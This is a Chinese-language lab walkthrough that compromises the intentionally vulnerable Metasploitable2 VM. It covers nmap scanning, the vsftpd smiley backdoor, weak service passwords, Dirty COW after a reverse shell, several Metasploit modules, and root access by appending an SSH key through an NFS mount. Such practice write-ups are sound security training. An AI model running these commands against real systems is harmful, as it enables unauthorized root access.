#  Metasploitable2-Linux。关于老师给了任务，一位彦祖返回家无私奉献，打穿靶场的故事。手搓+msf提权漏洞利用   
原创 泷羽Sec-朝阳  泷羽Sec-朝阳   2025-04-07 23:25  
  
# Metasploitable2-Linux  
### 1、主机发现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26d5iaSxFQ80O2W2Nfib3DGesxS9ImZqsuyVSmqntNwdR0LiaP4QCexqKhQ/640?wx_fmt=png&from=appmsg "")  
首先打开靶机就是这个界面，你没看错，通常情况下你是不可能知道账户密码的，所以老老实实去做  
```
arp-scan -l
主机探测，由于你开的靶机是nat模式，所以外界无法连接到你的靶机，只有你同网段下kali机可探测到

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26LoX1J3WezAnzH3jXoF5icat9Mq0eGwx4Iib8qzAKazYG7ckSO95mRtYQ/640?wx_fmt=png&from=appmsg "")  
这里的192.168.66.134就是你的靶机ip，上面两个和最下面的都不是，自己判断判断  
### 2、端口扫描  
  
我们要知道该靶机存在什么漏洞，我们先想办法知道他开起了什么端口和服务  
```
nmap -sS -sV 192.168.66.134
扫描端口服务信息、版本等
这里nmap语法很多，-h可以查询，自行拼接

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU2696CTcw1fAXDeVJPbdKv0vsZzGx9yJnGrlKXu962UnoaHO8HVHyRWxQ/640?wx_fmt=png&from=appmsg "")  
这条命令可以扫描历史漏洞，-p后面加的是端口号，就是你要扫描哪些端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26iaVTVR5cqwzHcZkZKDcDPicSFiaBBA5mXbJic4A6E9ug7rdYcxpia7N1I8A/640?wx_fmt=png&from=appmsg "")  
这是所有端口的服务以及版本信息，我们可以根据这些服务进行提权  
### 3、目录扫描  
```
dirsearch -u http://192.168.66.134:80/ -e * -i 200

```  
  
这里使用gobuster、wfuzz、dirb都可以，自行查询命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26rMUoDg5854WfibQ7fVNGiaSZN5OmP8P7Q525HmPRGic8QApQoYDafKXYQ/640?wx_fmt=png&from=appmsg "")  
这是我们扫描出来的80端口的目录，我们都访问一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26KNdW6bugTicaadBCvgB8BViafBQAstXXNrmKALEkPAhQHepd2eRBtkAA/640?wx_fmt=png&from=appmsg "")  
### 4、端口访问  
  
首先我们尝试访问弱口令和匿名访问  
#### 1、21端口提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26U0C2oPpfViamBCcfGTvwCEiaEbGBQibDiaPewWlnSNic40wDpoEaqfutnNA/640?wx_fmt=png&from=appmsg "")  
该服务版本比较老，我们找到了一个笑脸攻击，我们复现尝试一下，或者找一下vsftpd的exp  
```
nc 192.168.20.66 21
USER anonymous
PASS
这里匿名登录失败了，我们尝试其他提权方法

```  
  
这里存在一个笑脸攻击，就是我们连接该ip的21端口时，我们将用户名输入后面加上“:)”笑脸的符号，然后扫描一下6200端口，再次连接到21端口即可提权成功为root用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26XPSCVgOkOtKFPOtLDsgsqDNL2KaKSorIa4Vd2lXzbWTxnf5xs77ZpA/640?wx_fmt=png&from=appmsg "")  
这里先笑脸登录，密码任意输入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU265X1vKTypr7TuFUMH7ic3HZdU1KtoEgJ3cs3StibkNwtIUu5qSPWXztjQ/640?wx_fmt=png&from=appmsg "")  
nmap扫描，出现lm-x字符，然后netcat连接就是root用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26u3HBQib0wWkNxKBPhibccWvNPsvyGGFDwBtFjx8HgqX1PHCibtRVgTdjw/640?wx_fmt=png&from=appmsg "")  
#### 2、22端口、23端口、脏牛内核提权  
  
这里22端口存在弱口令。msfadmin/msfadmin  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU268uUiac3WF8TUTBxlicY6QpAjj0D1lQYMtiap3rxjDnfKmibciadJiamZURag/640?wx_fmt=png&from=appmsg "")  
这里23端口的弱口令为msfadmin，但是只是一个shell，没有root权限，我们可以尝试脏牛内核提权，我们尝试一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26BevWdpYmhNtpmlfIglwBia7iaogTwN8NKUYsf9SUHAwmIibk67U748zfA/640?wx_fmt=png&from=appmsg "")  
这里貌似是历史漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26k6JcX6ma0ENMUQBzq7cSUCKNTgalickRaUMZLX7vZicic21S4PJLUPDSQ/640?wx_fmt=png&from=appmsg "")  
这个版本不算新，试试脏牛![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU267A9hkgeDmCict24sic9ldsvtungIxDXjYZcwctZvNwPBHIQ1QwqOzF2Q/640?wx_fmt=png&from=appmsg "")  
这个版本一堆漏洞，随便找个脏牛提权试试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU262A1WPfSTicQKy8bfVNrH7cBNKRUNEZ8tv7QibrtESXz4RNnvO34aBslQ/640?wx_fmt=png&from=appmsg "")  
试下这个40839.c，然后我们下载上传到靶机上去，看看什么情况  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26diaszoDXD9GJ3CVRt2KicxvtjTOsZ3icxe0jeoufpPrYL4dz6y9rQibWyg/640?wx_fmt=png&from=appmsg "")  
这里传输文件记得开个python的环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU263z5Aw5hCcrGZNiaH7ia8IUacBSnQoAWdX70oLtkRFUYnF0E7AssBzZDw/640?wx_fmt=png&from=appmsg "")  
这里我们反弹一个shell，kali开一个nc监听端口为6666，靶机去连接一下，然后我们下载脏牛的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26aArdvGFvI186WsTYiam6v5AbXvvjEVQkAZdFLU51dvDsgCZn0IibOe0g/640?wx_fmt=png&from=appmsg "")  
然后就是按照c文件的步骤就可以，然后这个脏牛也能提权  
#### 3、80端口cgi提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26Uc0V1ht1xmVrDqXhERNCjxibRpfAR1aeyKxt9wDiae29DDiaZQTQ8cNpQ/640?wx_fmt=png&from=appmsg "")  
这里存在一个cgi接口注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26KQoqgEk8b5E6suaeuJCooqdRz4CogAL0L4OqNialfBWr8msmicMayfibQ/640?wx_fmt=png&from=appmsg "")  
这里一个？-s就能看源码 这里可以拿bp抓宝构造url可以远程命令执行，我就不演示了，有兴趣去找一下cgi接口注入。我们使用msf一步到位  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26a7ha2q89ibvN0EgHbia0AibJI7wlC7HWTYfbttNQEZCvlria1bSA7Q6SlQ/640?wx_fmt=png&from=appmsg "")  
这里得到了一个shell，然后自己使用脏牛或者其他漏洞即可提权  
#### 4、5900端口弱口令提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26Ym32mISI3tHbYHFcTy7icDxy0YHyHY1Mxb57UcpyssFrfp4ONJxZKsA/640?wx_fmt=png&from=appmsg "")  
没想到直接就是root权限  
```
 vncviewer ip

```  
#### 5、mysql弱口令  
  
mysql -h 192.168.66.134 -u root --skip-ssl 是这样的，为什么加上后面参数，是因为靶机版本太低太低了，需要关闭这个服务，我们直接就登录到了mysql，信息随便看了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26yon8tiawH3yZLzNs644Mr9XOqhsicaEAG2ibKoHldoToJiaXpPruCbkVQA/640?wx_fmt=png&from=appmsg "")  
#### 6、5432端口PostgresQL弱口令  
  
PostgresQL弱密码 使用psql -h 192.168.66.134 -U postgres 密码：postgres 登录成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26jxe75rhefwhuryAAxzQtY6Rj7Y4tLg32ibb2w6vSAUKL7pOYGeic39kg/640?wx_fmt=png&from=appmsg "")  
#### 7、139和445都是Smb服务类型，共享服务。  
  
这里就不手搓了，太累了。直接上msf了，不过自己练习的时候不建议去用msf。 这个自行尝试，有很多smb提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26TVxINtVbQ9ttp0EjJ753NrtuArq5fZkCfXjMjPejlxQcGlicSAWtlrQ/640?wx_fmt=png&from=appmsg "")  
#### 8、6667端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26yfKkQwPtOw8PF1Oj80fCFGN7bKnL775ZOGZrSA64j43LSV2XlpoicFg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26AwdfncuicBx1uTcUADibGHoXZ2OsrydVf54OREsbBWSU9CRplK0icUWUw/640?wx_fmt=png&from=appmsg "")  
这里是连接的服务  
```
search rcd
use exploit/unix/irc/unreal_ircd_3281_backdoor
show options
set rhosts 192.168.206.216
run
直接msf吧，上一个就是使用上传工具输入一些恶意代码然后执行

```  
#### 8、Java RMI SERVER命令执行漏洞（1099端口）  
  
Nmap –p0-65535 ip 来查看1099端口是否开启，查看1099端口即可 这里还是用msf吧，感觉这个靶机就是练习msf的，也可以找一下其他工具传shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26SqlvlUX2pZ1yg9key8SicTrFhHEl1Ltayy3jbAkHYLYxmxjyjexm78g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU2657QyH4e89A2gaUEWRUC6Hh5r0hjSwJ15GDOZmM9gsk5JjYIUeJdCYg/640?wx_fmt=png&from=appmsg "")  
#### 8、1524端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26UHiaDIx8qYSNAiaDHENvoomtqs1UxkMwKozAxpxO48Bb5urlULAyhn2g/640?wx_fmt=png&from=appmsg "")  
这里telnet直接连就行telnet 192.168.66.134 1524  
因为这里有个root的shell![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26VO6sS3BuO1ibVCC45nu8sU13wpC8UlbIibIVQ0MGYGiaxZkcV6tIH5mibw/640?wx_fmt=png&from=appmsg "")  
这里是因为我们之前用了脏牛提权，但是我们连接这个端口就是root权限，只是账户不同  
#### 9、Tomcat管理台默认口令漏洞（8180端口）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26Sdic6kKGZhzhY1YkBS81JUibrxBzOVpWicwYIffyErXtO5wP263JJqcZg/640?wx_fmt=png&from=appmsg "")  
这里一个弱口令，tomcat/tomcat  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26icdiajiafUAxNHX4PSnSCC1icULnxBJcwdic0WLEKXIYEmu7NmE9TDcLP4g/640?wx_fmt=png&from=appmsg "")  
这里文件只能传war，应该有一些绕过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26AZ7Kqv4RTfb3NnPjOxHP3TrkjsBq3TSly2SUfuZStElgvNLHAqbMYQ/640?wx_fmt=png&from=appmsg "")  
这里哥斯拉生成的马记得关防火墙 这里我没成功，我也没想用msf，可能是war包执行之类的，没学过，不会。感兴趣自己做，msf随便提权 或者bp抓包改一改也可以  
#### 10、Druby远程代码执行漏洞8787端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26ImaClib6ajHYb7pkCl83MbXnTwkwLujCQWuY8QUCIgDibpYh8hricTbCg/640?wx_fmt=png&from=appmsg "")  
这里是探测出来的 直接msf吧，不装了，11点了不想做了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1Gr1mSSszcHYWJvb3TicU26k4LpAhicib06KicGKSaP3sBuiaovhIrO41ZQyDkXwsOEgy5yW5iaYkS1w8w/640?wx_fmt=png&from=appmsg "")  
这个可能是版本问题，找不到exp了，自行脑补吧  
#### 10、Linux NFS共享目录配置漏洞（22端口）  
  
NFS 服务配置漏洞，赋予了根目录远程可写权限，导致/root/.ssh/authorized_keys可被修改，实现远程ssh无密码登陆。  
- 查看靶机上的nfs服务是否开启：rpcinfo -p ip  
  
- 查看靶机上设置的远程共享目录列表：showmount -e ip  
  
- 生成rsa公钥命令：sshkeygen （一直回车）  
  
- 在渗透机 /tmp目录下新建文件夹xxx，以备后续挂载需求,命令：mkdir /tmp/xxx  
  
- 把靶机ip的根目录挂载到渗透机上新建的/tmp/xxx/目录下；  
  
- 命令：mount –o nolock –t nfs ip:/ /tmp/msftables/  
  
- 把渗透机上生成的公钥追加到靶机的authorized_keys下  
  
- 命令：cat /root/.ssh/id_rsa.pub >> /tmp/xxx/root/.ssh/authorized_keys  
  
- 实现无密码ssh登录:ssh root@ip  
  
总结：这个靶场大量的漏洞，弱口令等，但是偏基础而且适合使用msf，但是真实学漏洞时候尽量不使用msf，因为靶场服务版本太老或者其他原因导致有些服务找不到相关wp只能手搓，但是没必要，当作小甜点吧，提权方法很多，但是没有sql注入文件上传之类的，我虽然很喜欢msf但还是有点抗拒了，希望养成手搓的好习惯。 我这里可能不是很全，但更多是扩大知识面吧加上msf的练手。 后续我也会出更多打靶文章，希望大家关注！谢谢。  
  
  
